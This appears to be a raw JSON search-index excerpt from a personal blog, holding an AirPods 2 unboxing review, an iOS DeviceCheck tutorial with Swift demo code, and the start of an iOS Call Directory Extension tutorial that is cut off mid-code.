Using Raspberry Pi as a HomeBridge Host to Connect All Mijia Appliances to HomeKitFurther Reading Xiaomi Smart Home New Purchases (AI Speaker, Temperature and Humidity Sensor, Scale 2, DC Inverter Fan) iOS ‚â• 13.1 Automation with ‚ÄúShortcuts‚Äù for Mijia Smart Home (Using the built-in Shortcuts app in iOS ‚â• 13.1 to complete automation) Mi Home APP / Xiao Ai Speaker Region Issues If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "AirPods 2 UnboxingÔΩúDetailed Hands-On Experience and Key Features", "url": "/posts/zrealm-life/airpods-2-unboxing-detailed-hands-on-experience-and-key-features-33afa0ae557d/", "categories": "ZRealm Life.", "tags": "english, ai-translation, airpods, 3c, unboxing, airpods2, lifestyle", "date": "2019-05-01 21:32:20 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!AirPods 2 Unboxing and Initial Experience Review (Laser Engraved Edition)More ...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!AirPods 2 Unboxing and Initial Experience Review (Laser Engraved Edition)More clever, incredibly impressive.[Latest] Apple Watch Series 6 Unboxing &amp; Two-Year Usage Experience¬†¬ª&gt; Click HereWhen AirPods first came out, I didn‚Äôt pay much attention; at first glance, they just looked like wireless Bluetooth earbuds shaped like a showerhead. At that time, the wireless Bluetooth earbud market was already crowded with many options, covering every style and need you could think of, plus the price wasn‚Äôt affordable. What was so special about them?I only truly appreciated its ‚Äúamazing‚Äù qualities after using it myself. Since its launch, AirPods have consistently ranked among the top-selling Bluetooth earphones, and this reputation is well-earned. It‚Äôs not just the loyalty of Apple fans. So, what makes it so good? Let‚Äôs continue reading.True Fragrance MemeBackground of AcquisitionOriginally just a simple iPhone user, last year I got a MacBook Pro and an Apple Watch S4, starting to fall into the Apple ecosystem (commonly called the Apple family bucket). I bought the watch, but was still missing a pair of earphones.The Bluetooth earphones I was originally using had been in service for a while. They were a fairly standard model‚Äînot bad but nothing outstanding. The sound quality was average, and the battery life was sufficient. The main issues were unclear call quality, signal interference, long press needed to power on/off, waiting for pairing, and unclear battery indicators‚Äîsmall annoyances. I mostly used them for commuting and exercising, while at the computer I usually used speakers or wired earphones, so they met my basic needs.After the release of AirPods 1st generation, most of my friends had positive experiences. This time, I decided to follow the trend and got the AirPods 2nd generation.p.s. Since I have never used the 1st generation, my reasons for purchasing will not focus on improvements compared to the 1st generation (this article will not mention differences from the 1st generation).Choosing Between Wireless or Wired Versions?The wireless and wired versions differ by $1,200. At first, I was considering buying the wireless version; thinking about the messy charging cables on my bedside table and having one less cable to carry when traveling abroad, the convenience really tempted me!After Apple announced the cancellation of AirPower, I searched online for similar products and bought a 2-in-1 wireless charging pad for iPhone and Apple Watch. Since iPhone and AirPods don‚Äôt often need charging at the same time, alternating their use allows it to function as a 3-in-1 charger.Everything seemed fine until I placed the order and received the product. When I actually used it, I found that it couldn‚Äôt charge both my phone and watch simultaneously. The watch‚Äôs battery level was almost 0%, and the charging speed was very slow. The current just couldn‚Äôt ramp up! Even using a 5.1V/2.1A charger didn‚Äôt help. I‚Äôm not sure what voltage charger is needed. Checking user reviews, this issue is not isolated. In the end, I reluctantly returned it.Just two cables (AirPods and iPhone both use Lightning / Apple Watch has a dedicated cable), and wired is still faster; wireless requires that version + the board‚Äôs cable + possibly a bigger connector? Compared to that, there‚Äôs no clear convenience advantage.So in the end, I chose the wired version of AirPods 2. p.s. The difference between the wireless and wired versions is that the wired version‚Äôs charging case is the same as the first generation (indicator light inside); the wireless version‚Äôs charging case has the indicator light outside and can also be charged with a cable.OrderingFrom the announcement to the sale (Taiwan), about one month passed. Every day, I checked the official website three times a day to see if the sale had started. I believe many users did the same XD; it was really nerve-wracking, especially since other countries had already started selling!4/23 As soon as it went on sale, I placed an order immediately. This time, AirPods 2 can be laser engraved (engraving), so of course I got it engraved:ŒõVICII ‚ó¢ ‚ó§ ‚Äî Official Preview Image In memory of Swedish legendary music producer AVICII ‚ÄúOne day you‚Äôll leave this world behind So live a life you will remember.‚Äù Avicii ‚Äî The NightsYou can engrave 11 characters, including Chinese/English/symbols/spaces; most symbols are supported in tests. If unsupported, it will show ‚ÄúCannot engrave these characters:‚Äù, so no need to worry about garbled text.p.s Engraving takes about one extra week. Without engraving, you can buy directly at 101 or through dealers (cheaper prices).The official estimated delivery time is: 5/3~5/10. On 4/29, I was notified that the shipment left Shanghai. Luckily, I received it on 4/30, just before the Labor Day holiday on May 1st (super fast!! From Shanghai to Taipei).Unboxing!Outer PackagingExpandClose-up photo of the subjectFull-body photo of the subjectContents in the StomachUnboxing is done! The overall weight feels substantial, and the texture and quality are excellent. The engraving is also very detailed; it meets the standard expected of Apple products!UsageFirst Use:When using brand new AirPods for the first time, simply open the AirPods case near your iPhone, and a prompt will appear to complete the pairing; there is no need to press the pairing button.Set up headphone controls:Mobile Version:Open ‚ÄúSettings‚Äù -&gt; ‚ÄúBluetooth‚Äù -&gt; ‚ÄúFind your AirPods‚Äù -&gt; ‚ÄúSettings‚ÄùMacBook Version:Top left corner ‚ÄúÔ£ø‚Äù -&gt; ‚ÄúSystem Preferences‚Äù -&gt; ‚ÄúBluetooth‚Äù (If no sound, please switch the audio output to AirPods)You can choose the double-tap action for either the left or right ear.Click location is below the small hole on the upper side of the earphone body:Actually, I had to explore a bit to find the location.Some TipsQuickly switch back to using on iPhone:Pull up the menu -&gt; Select the audio section -&gt; Tap the icon at the top right -&gt; Switch to AirPodsYou can also check the AirPods battery level here. (Shows the battery level of the one with lower power)How to Check Battery Level Using Widgets:Swipe left to Control Center -&gt; tap ‚ÄúEdit‚Äù at the bottom -&gt; find ‚ÄúBattery‚Äù to add and reorderIn the future, you can swipe left on the Control Center to directly check the AirPods battery level (showing the battery of the earbud with lower charge). To see the battery levels of the left and right earbuds and the case, you need to put one AirPod back into the case and open the case (because the case itself has no Bluetooth function):![The dust-proof film I applied inside the box](/assets/33afa0ae557d/1qoUfpf1Jh_jVrHN_l3QRew.webp){: lqip=‚Äùdata:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNDAwIiBoZWlnaHQ9IjE0MDAiPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbGw9ImdyZXkiLz48L3N2Zz4=‚Äù }*Inside the box are the dust-proof stickers I applied There is a BUG where your battery widget shows the battery level briefly and then disappears; please go to ‚ÄúSettings‚Äù -&gt; ‚ÄúDisplay &amp; Brightness‚Äù -&gt; ‚ÄúText Size‚Äù -&gt; reset to the default size (third level) to fix it!How to Check Battery Level on Apple Watch:Swipe up Control Center -&gt; Tap BatteryThe battery display window on the Apple Watch will also show the AirPods battery level below.p.s. But there seems to be a BUG sometimes it doesn‚Äôt displayAdditional Notes on Battery: When the AirPod battery is low, you will hear a chime in one or both AirPods. You will hear one chime when the battery is low, and another chime before the AirPods turn off. If AirPods are in the charging case with the lid open, the indicator light shows the AirPods‚Äô charging status. If the AirPods are not in the case, the indicator light shows the case‚Äôs status. Green means fully charged, while amber means less than one full charge remains. ‚Äî Taken from the official documentationUser ExperienceBefore writing my reflections, let me share a recent startup story I heard; in short: ‚ÄúWhen creating a product, we should not target a broad audience but focus on a small niche and then gradually expand.‚ÄùThe biggest difference between AirPods and other brands of Bluetooth earphones lies in the small-scale detailed experience. For example, music automatically pauses when you take one earbud out and resumes when you put it back in. You can use them right away when you take them out, and just put them back when not in use, without worrying about turning them on, off, or connecting. In terms of comfort, you can hardly feel they are there when wearing them.Charging is very fast, and it automatically charges when placed in the case; so you only need to keep an eye on the case‚Äôs battery level (the case can charge about 5 times). You rarely encounter situations where the Bluetooth earphones are dead and you have to wait for them to charge slowly.The delay is just as rumored; when watching videos or playing games, the lag is almost unnoticeable (I tested with the racing game Speed Domain).The Hey Siri feature initially seemed unnecessary since I could already use Hey Siri remotely with my watch. But after trying it, as mentioned above, it‚Äôs all about the ‚Äúdetailed experience.‚Äù Hey Siri on AirPods takes it to another level‚Äîyou don‚Äôt even need to raise your hand to activate it. You can just say Hey Siri directly, achieving a truly omnipresent Siri experience.A common scenario is when you‚Äôre tidying up and both hands are full; this feature becomes very convenient!Also, you can ask Siri to adjust the volume: ‚ÄúHey Siri! Louder,‚Äù or ‚ÄúHey Siri! Set volume to 75%.‚ÄùA one-sentence summary of using AirPods is: ‚ÄúEverything is so natural‚ÄùYou don‚Äôt need to worry about unnecessary things; headphones should just be headphones.Call Quality is equally impressive. Besides stable basic call quality, the microphone performance is outstanding, almost like a professional mic‚Äîtruly amazing. During a test call with a friend, they could hardly tell I was using AirPods!Wearing While Riding: I originally looked forward to listening to navigation while riding, but friends who have the first generation device said it‚Äôs not feasible. With more than 3/4 of the helmet on, the helmet pressing against the ears causes the earphones to fall off easily. This was confirmed in actual tests, which was a bit alarming. It‚Äôs recommended to only wear one earbud when riding and listening to navigation, as focusing on one ear is safer when putting on or taking off the helmet.Disadvantages:Finally, I have to mention the drawbacks I noticed.There are too few items controllable by gestures‚Ä¶ I‚Äôm really used to controlling volume with gestures (but thankfully, the watch can control Spotify volume).Also, the connection speed on the phone is indeed very fast, but the connection speed on my computer: my MacBook Pro 2018 is quite slow, while another Mac Mini connects as fast as the phone.The TESTV review channel also mentioned that when using the MacBook Pro closed with an external display, the AirPods signal would cut in and out! (I don‚Äôt experience this issue)However, why are there these differences? I guess it‚Äôs because of other signal interference (lights, screen output, other Bluetooth devices).Rumor Clarification: The size and shape are similar to wired EarPods, with the issue of easily falling off:First, there is a difference in size and shape compared to EarPods. I find EarPods a bit loose, but AirPods feel very stable and don‚Äôt fall off even when moving around. However, it really depends on the person; some may experience fit issues. It‚Äôs recommended to borrow a pair from a friend who has AirPods to try before buying!Or stick some artificial leather on the earbud to increase surface area and friction Sound quality is similar to EarPods: Actually, there is a big difference; AirPods have much better sound quality. Although it may fall short compared to other headphones in the same price range that focus on sound quality and lacks noise cancellation, AirPods are not designed primarily for sound quality, so it depends on personal preference.From my personal experience, the sound quality shows clear surround layers and a wide range, maintaining a good overall standard! Accessories:Because I have buttery hands, my AirPods are like an egg to me‚ÄîI‚Äôm afraid they‚Äôll slip and break easily. After reading many protective case recommendations, many people suggest this one: Catalyst AirPods Waterproof Carrying Case (Protective Case).The reasons for choosing this are: waterproof, drop-resistant, has a hook, and convenient to use (no need to remove it when taking out earphones or charging).Price: Around $1000Mini Unboxing:Front side: I bought a dark color because I was afraid of dirt.There are also corresponding paired keys on the back.To wear the earbuds, simply flip open the top half.The charging port at the bottom has a cover that can be opened and closed.p.s. To use the AirPods right away, I actually bought the case before the AirPods üòÇUser Question: Can the cases for the 1st and 2nd generation be used interchangeably?The distinction is not between generation 1 or 2, but between wired and wireless versions. If you have the wired version, both generation 1 and 2 are compatible. The wireless version has an indicator light on the outside and a pairing button located near the top center on the back. It cannot share a protective case with the wired version, so please pay attention to this ‚ö†Ô∏èNext is the dust-proof sticker inside the box:AHA AirPods Dustproof StickerA user asked about the fit issue:If not applied properly, it won‚Äôt fit tightly. I spent a long time making it fit perfectly; the edges feel slightly rough to the touch (doesn‚Äôt affect use, possibly due to tolerance?).It‚Äôs not easy to stick because the dust-proof sticker is a metal sheet, and the box itself has magnets that can easily pull it off during alignment.Currently, I find it somewhat unnecessary and am unsure of the effects after using it for a while, so I remain cautious for now.Anti-Fraud AwarenessPlease be especially careful. Counterfeit versions of the chip have appeared across the strait, featuring the same pairing animation and battery display, making them nearly indistinguishable from the original in appearance.The current main identification method is through software: Battery Display: The genuine product shows battery levels for the left ear, right ear, and case separately; the counterfeit only shows one. In the Bluetooth settings, the genuine version allows you to set click functions for the left and right ear; the counterfeit version only has disconnect and forget options. The charging case indicator light turns off when connected to a genuine product / stays on with a counterfeit one But since it‚Äôs uncertain whether counterfeit versions will be fixed later, it‚Äôs safer for everyone to buy from official or major retail channels.‚ö†Ô∏èUnethical merchants are now more rampant, selling pirated goods at prices close to the genuine ones‚ö†Recently, on Facebook and Google Ad Network, I found some unscrupulous sellers offering pirated products at prices close to the genuine ones (the website is a common one-page scam page ), which is very malicious; I think if you are trying to save a little money by spending around 1000 to buy AirPods, you should be aware that they are fake, but selling pirated products at genuine prices is really low-level! Please note, the price of brand new AirPods should not be below $4500.Scams and Sellers from Unknown SourcesIf you accidentally placed an order with cash on delivery, please refuse the package upon delivery. If you‚Äôve already received it, quickly call the courier company to request a return (be firm). For any issues, you can join the FB Shopping Ad Victims Support Group.If you see ads like this, please click the top right corner to report them to Facebook/Google, or click the ads repeatedly to quickly burn through their ad budget.Also, if you find counterfeit AirPods or Apple products, do not tolerate it. Whether it‚Äôs from unknown websites, one-page shopping scams, Shopee, or Ruten, be sure to contact the Intellectual Property Protection Team to handle it.Or selling the 1st generation as the 2nd generation?Second Generation Outer Box ImagePlease confirm: AirPods 2 Models: A2031, A2032 AirPods 1st Generation Models: A1523, A1722 Production Year: ‚â• 2019 For a detailed comparison between the 1st and 2nd generation, please refer to this article: AirPods Á¨¨‰∏Ä‰ª£ËàáÁ¨¨‰∫å‰ª£Ëæ®Ë≠òÊäÄÂ∑ßÂ§ßÂÖ¨ÈñãÔºåÈÄèÈÅéÈÄô5 ÊãõÈ¶¨‰∏äÂçÄÂàÜÂá∫‰æÜOther Interesting Unboxing and Experience VideosLet‚Äôs have a family bucketWant to know the hands-on experience with the Apple Watch Series 6?Apple Watch Series 6 Unboxing &amp; 2-Year Usage Experience¬†¬ª&gt; Click HereIf you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "iOS DeviceCheckÔΩúImplement One-Time Offers and Trials Seamlessly with Swift", "url": "/posts/zrealm-dev/ios-devicecheck-implement-one-time-offers-and-trials-seamlessly-with-swift-c5e7e580c341/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, ios, ios-app-development, ios-11, swift, mobile-app-development", "date": "2019-04-29 23:30:01 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Perfect iOS Implementation of One-Time Discounts or Trials (Swift)iOS DeviceCh...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Perfect iOS Implementation of One-Time Discounts or Trials (Swift)iOS DeviceCheck Goes With You to the Ends of the EarthWhile writing the previous article on Call Directory Extension, I accidentally discovered this lesser-known API. Although it‚Äôs not new (announced at WWDC 2017 / supported on iOS ‚â•11) and very easy to implement, I still did a bit of research and testing and compiled an article as a record.What can DeviceCheck do? Allow developers to create identification tags for users‚Äô devicesSince iOS ‚â• 6, developers cannot access the device‚Äôs unique identifier (UUID). The workaround is to use IDFV combined with KeyChain (for details, refer to the previous article). However, the UUID will reset when changing iCloud accounts or resetting the phone, etc. This cannot guarantee device uniqueness. If used for business logic storage and decisions, such as first-time free trials, users might exploit this by frequently changing accounts or resetting phones to repeatedly access unlimited free trials.Although DeviceCheck does not guarantee an unchanging UUID, it provides a ‚Äústorage‚Äù function. Apple offers 2 bits of cloud storage per device. By sending a temporary token generated by the device to Apple, you can write/read those 2 bits of information.2 bits? What can it store?Only four states can be combined, limiting the available functions.Comparison with the Original Storage Method:‚úì indicates the data is still availablep.s. I personally tested this on my own phone, and the results matched; even after logging out and switching iCloud accounts, deleting all data, resetting all settings, restoring to factory defaults, and reinstalling the app, it still retrieved the values.The main operation process is as follows:The iOS app uses the DeviceCheck API to generate a temporary token for device identification, which is sent to the backend. The backend then combines the developer‚Äôs private key and developer information to create a JWT, which is sent to Apple‚Äôs server. After receiving the response from Apple, the backend processes the format and sends it back to the iOS app.Applications of DeviceCheckAttached is a screenshot of DeviceCheck from WWDC2017:Because each device can only store 2 bits of information, the possible items are roughly as the official documentation mentions, including whether the device has been trialed, whether it has paid, whether it is a banned user, etc.; and only one item can be implemented.Support: iOS ‚â• 11Start!After understanding the basic information, let‚Äôs get started!iOS APP side:import DeviceCheck//....//DCDevice.current.generateToken { dataOrNil, errorOrNil in guard let data = dataOrNil else { return } let deviceToken = data.base64EncodedString() //... //POST deviceToken to backend, let backend query Apple server, then return result to APP for processing}As described in the process, the APP only needs to obtain a temporary identification Token (deviceToken)!Next, send the deviceToken to our backend API for processing.Backend:The focus is on the backend processing part.1. First, log in to the Developer Console and note down the Team ID2. Click the sidebar‚Äôs Certificates, IDs &amp; Profiles to go to the certificate management platformSelect ‚ÄúKeys‚Äù -&gt; ‚ÄúAll‚Äù -&gt; ‚Äú+‚Äù at the top right to add a new oneStep 1. Create a new Key and check ‚ÄúDeviceCheck‚ÄùStep 2. ‚ÄúConfirm‚Äù ConfirmationUnderstood. Please provide the Markdown paragraphs you want me to translate into English.After completing the final step, note down the Key ID and click ‚ÄúDownload‚Äù to save the privateKey.p8 private key file.At this point, you have prepared all the necessary data for push notifications: Team ID Key ID privateKey.p8 3. Combine JWT (JSON Web Token) format according to Apple specificationsAlgorithm: ES256//HEADER:{ \"alg\": \"ES256\", \"kid\": Key ID}//PAYLOAD:{ \"iss\": Team ID, \"iat\": Request timestamp (Unix Timestamp, EX: 1556549164), \"exp\": Expiration timestamp (Unix Timestamp, EX: 1557000000)}//Timestamps must be in integer format!Get the JWT string of the token: xxxxxx.xxxxxx.xxxxxx4. Send Data to Apple Server &amp; Receive ResponseAPNS push notifications have separate development and production environments: Development environment: api.development.devicecheck.apple.com (For some reason, my development environment always returns failure when sending) Production environment: api.devicecheck.apple.comDeviceCheck API offers two operations:1. Query stored data: https://api.devicecheck.apple.com/v1/query_two_bits//Headers:Authorization: Bearer xxxxxx.xxxxxx.xxxxxx (Combined JWT string)//Content:device_token:deviceToken (Device token to query)transaction_id:UUID().uuidString (Query identifier, here represented by UUID)timestamp: Request timestamp (milliseconds), note! This is in milliseconds (e.g., 1556549164000)Return Status:Official DocumentationReturned Content:{ \"bit0\": Int: 2 bits data, first bit value: 0 or 1, \"bit1\": Int: 2 bits data, second bit value: 0 or 1, \"last_update_time\": String: \"Last modified time YYYY-MM\"}p.s. You read that right, the last modified time can only be displayed up to year-month2. Write Stored Data: https://api.devicecheck.apple.com/v1/update_two_bits//Headers:Authorization: Bearer xxxxxx.xxxxxx.xxxxxx (Combined JWT string)//Content:device_token:deviceToken (Device token to query)transaction_id:UUID().uuidString (Query identifier, here represented by UUID)timestamp: Request timestamp (milliseconds), note! This is in milliseconds (e.g., 1556549164000)bit0: 2 bits, first bit of the data: 0 or 1bit1: 2 bits, second bit of the data: 0 or 15. Get the Result Returned from Apple ServerReturn Status:Official DocumentationResponse content: None, a 200 status code indicates a successful write!6. Backend API Returns Results to the APPThe app is complete once it responds to the corresponding states!Backend Supplement:I haven‚Äôt worked with PHP for a long time. If interested, please refer to the requestToken.php section in the article DeviceCheck added in iOS11.Swift Demo Example:Since I cannot provide backend implementation and not everyone knows PHP, here is an example using pure iOS (Swift) that handles backend tasks (JWT creation, sending data to Apple) directly within the app for your reference!Simulate and execute all content without writing backend code. ‚ö† Please note This is for testing demonstration only and is not recommended for production use ‚ö†Thanks to Ethan Huang for the great CupertinoJWT library that supports generating JWT format content within iOS apps!Main Demo Program and Interface:import UIKitimport DeviceCheckimport CupertinoJWTextension String { var queryEncode:String { return self.addingPercentEncoding(withAllowedCharacters: .whitespacesAndNewlines)?.replacingOccurrences(of: \"+\", with: \"%2B\") ?? \"\" }}class ViewController: UIViewController { @IBOutlet weak var getBtn: UIButton! @IBOutlet weak var statusBtn: UIButton! @IBAction func getBtnClick(_ sender: Any) { DCDevice.current.generateToken { dataOrNil, errorOrNil in guard let data = dataOrNil else { return } let deviceToken = data.base64EncodedString() // In production: // POST deviceToken to backend, let backend query Apple server, then return result to app //!!!!!! The following is only for testing/demo purposes, not recommended for production!!!!!! //!!!!!! Do not expose your PRIVATE KEY carelessly !!!!!! let p8 = \"\"\" -----BEGIN PRIVATE KEY----- -----END PRIVATE KEY----- \"\"\" let keyID = \"\" // Your KEY ID let teamID = \"\" // Your Developer Team ID :https://developer.apple.com/account/#/membership let jwt = JWT(keyID: keyID, teamID: teamID, issueDate: Date(), expireDuration: 60 * 60) do { let token = try jwt.sign(with: p8) var request = URLRequest(url: URL(string: \"https://api.devicecheck.apple.com/v1/update_two_bits\")!) request.httpMethod = \"POST\" request.addValue(\"Bearer \\(token)\", forHTTPHeaderField: \"Authorization\") request.addValue(\"application/x-www-form-urlencoded\", forHTTPHeaderField: \"Content-Type\") let json:[String : Any] = [\"device_token\":deviceToken,\"transaction_id\":UUID().uuidString,\"timestamp\":Int(Date().timeIntervalSince1970.rounded()) * 1000,\"bit0\":true,\"bit1\":false] request.httpBody = try? JSONSerialization.data(withJSONObject: json) let task = URLSession.shared.dataTask(with: request) { (data, response, error) in guard let data = data else { return } print(String(data:data, encoding: String.Encoding.utf8)) DispatchQueue.main.async { self.getBtn.isHidden = true self.statusBtn.isSelected = true } } task.resume() } catch { // Handle error } //!!!!!! The above is only for testing/demo purposes, not recommended for production!!!!!! // } } override func viewDidLoad() { super.viewDidLoad() DCDevice.current.generateToken { dataOrNil, errorOrNil in guard let data = dataOrNil else { return } let deviceToken = data.base64EncodedString() // In production: // POST deviceToken to backend, let backend query Apple server, then return result to app //!!!!!! The following is only for testing/demo purposes, not recommended for production!!!!!! //!!!!!! Do not expose your PRIVATE KEY carelessly !!!!!! let p8 = \"\"\" -----BEGIN PRIVATE KEY----- -----END PRIVATE KEY----- \"\"\" let keyID = \"\" // Your KEY ID let teamID = \"\" // Your Developer Team ID :https://developer.apple.com/account/#/membership let jwt = JWT(keyID: keyID, teamID: teamID, issueDate: Date(), expireDuration: 60 * 60) do { let token = try jwt.sign(with: p8) var request = URLRequest(url: URL(string: \"https://api.devicecheck.apple.com/v1/query_two_bits\")!) request.httpMethod = \"POST\" request.addValue(\"Bearer \\(token)\", forHTTPHeaderField: \"Authorization\") request.addValue(\"application/x-www-form-urlencoded\", forHTTPHeaderField: \"Content-Type\") let json:[String : Any] = [\"device_token\":deviceToken,\"transaction_id\":UUID().uuidString,\"timestamp\":Int(Date().timeIntervalSince1970.rounded()) * 1000] request.httpBody = try? JSONSerialization.data(withJSONObject: json) let task = URLSession.shared.dataTask(with: request) { (data, response, error) in guard let data = data,let json = try? JSONSerialization.jsonObject(with: data, options: .mutableContainers) as? [String:Any],let stauts = json[\"bit0\"] as? Int else { return } print(json) if stauts == 1 { DispatchQueue.main.async { self.getBtn.isHidden = true self.statusBtn.isSelected = true } } } task.resume() } catch { // Handle error } //!!!!!! The above is only for testing/demo purposes, not recommended for production!!!!!! // } // Do any additional setup after loading the view. }}ScreenshotThis is a one-time offer redemption; each device can only claim it once!Full Project Download:If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "iOS Caller ID with SwiftÔΩúBuild Your Own Number Recognition & Tagging", "url": "/posts/zrealm-dev/ios-caller-id-with-swift-build-your-own-number-recognition-tagging-ac557047d206/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, ios, whoscall, swift, ios-app-development, ios-apps", "date": "2019-04-28 00:07:27 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Recognize Your Own Phone (Swift)iOS Self-made Whoscall Incoming Call Identific...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Recognize Your Own Phone (Swift)iOS Self-made Whoscall Incoming Call Identification and Phone Number Tagging FeaturesOriginI have always been a loyal Whoscall user, starting from when I used an Android phone. It can instantly display information about unknown callers, allowing me to decide whether to answer immediately. Later, when I switched to the Apple ecosystem, my first Apple phone was the iPhone 6 (iOS 9). Using Whoscall then was very inconvenient because it couldn‚Äôt identify calls in real-time; I had to copy the phone number and search in the app. Later, Whoscall offered a service to install the unknown caller database locally on the phone. Although this solved the real-time identification issue, it often messed up your phone contacts!Until iOS 10+, Apple opened the Call Directory Extension permission to developers, allowing whoscall to offer an experience comparable to the Android version, if not better. (The Android version has many ads, but this is understandable from a developer‚Äôs perspective.)Purpose?What can the Call Directory Extension do? Phone Call Identification Tag Phone Incoming Call Identification Tag Call Log Recognition Tags Call Reject Blacklist Settings Limitations? Users must manually go to ‚ÄúSettings‚Äù &gt; ‚ÄúPhone‚Äù &gt; ‚ÄúCall Blocking &amp; Identification‚Äù to enable your app before use. Can only recognize phone numbers using an offline database (cannot obtain caller information in real-time to call APIs for lookup, only pre-stored number-to-name mappings in the phone database).Therefore, Whoscall regularly pushes notifications asking users to open the app and update the caller ID database. Quantity limit? Currently, no information found. It likely depends on the user‚Äôs phone storage with no specific limit; however, if the number is large, the recognition list and block list should be processed and written in batches! Software requirements: iOS version must be ‚â• 10 ‚ÄúSettings‚Äù -&gt; ‚ÄúPhone‚Äù -&gt; ‚ÄúCall Blocking &amp; Identification‚ÄùApplication Scenarios? Messaging apps and office communication apps may have the other person‚Äôs contact within the app, but their phone number is not actually saved in your phone‚Äôs address book. This feature helps prevent missed calls from colleagues or even your boss by avoiding them being marked as unknown callers. Our site ( ÁµêÂ©öÂêß ) or my personal ( 591ÊàøÂ±ã‰∫§Êòì ) uses forwarding numbers for calls made by users to contact stores or landlords. The calls are routed through a transfer center to the target phone. The general process is as follows: The phone numbers dialed by users are all forwarded to the call center‚Äôs main number (#extension), so the real phone numbers are not revealed. This protects personal privacy and allows tracking how many people contact the business (to evaluate effectiveness). It also identifies where the call originated (e.g., webpage shows #1234, app shows #5678). Additionally, free service can be promoted, with our side covering the phone communication costs.However, this approach brings an unavoidable issue: phone numbers become messy. Users cannot identify who they are calling or, when the store calls back, they don‚Äôt know who the caller is. Using phone identification features can greatly solve this problem and improve the user experience!Here is the final product image directly:Wedding AppYou can see that when entering a phone number or receiving a call, the recognition result is displayed directly. The call history list is also organized, with the recognition result shown at the bottom.Call Directory Extension Call Identification Process:Start Work:Let‚Äôs get started!1. Add Call Directory Extension to iOS ProjectXcode -&gt; File -&gt; New -&gt; TargetSelect Call Directory ExtensionEnter Extension NameYou can also add Scheme for easier debugging.Under the directory, the Call Directory Extension folder and program will appear.2. Start Writing Call Directory Extension Related CodeFirst, return to the main iOS project.The first question is how to determine if the user‚Äôs device supports Call Directory Extension or if the ‚ÄúCall Blocking &amp; Identification‚Äù setting is enabled:import CallKit////......//if #available(iOS 10.0, *) { CXCallDirectoryManager.sharedInstance.getEnabledStatusForExtension(withIdentifier: \"Enter the call directory extension's bundle identifier here\", completionHandler: { (status, error) in if status == .enabled { // Enabled } else if status == .disabled { // Disabled } else { // Unknown, not supported } })}As mentioned earlier, the caller ID function operates by maintaining a recognition database locally; next is the key question of how to achieve this feature.Unfortunately, you cannot directly write data to the Call Directory Extension. Therefore, you need to maintain a corresponding structure separately, and the Call Directory Extension will read your structure to write the identification data into the database. The process is as follows:It means we need to maintain our own database file, then let the Extension read and write it on the phone.What should the so-called identification data or files look like? It‚Äôs actually just a dictionary structure, like: [‚Äúphone‚Äù:‚ÄùWang Daming‚Äù] Local files can use some Local DB (but the Extension must also support installation and usage). Here, a .json file is directly stored on the phone; storing directly in UserDefaults is not recommended‚Äîit‚Äôs okay for testing or very small data, but strongly discouraged for real applications!Alright, let‚Äôs begin:if #available(iOS 10.0, *) { if let dir = FileManager.default.containerURL(forSecurityApplicationGroupIdentifier: \"Your cross-Extension, Group Identifier name\") { let fileURL = dir.appendingPathComponent(\"phoneIdentity.json\") var datas:[String:String] = [\"8869190001234\":\"Mr. Lee\",\"886912002456\":\"Big Guy\"] if let content = try? String(contentsOf: fileURL, encoding: .utf8),let text = content.data(using: .utf8),let json2 = try? JSONSerialization.jsonObject(with: text, options: .mutableContainers) as? Dictionary&lt;String,String&gt;,let json = json2 { datas = json } if let data = 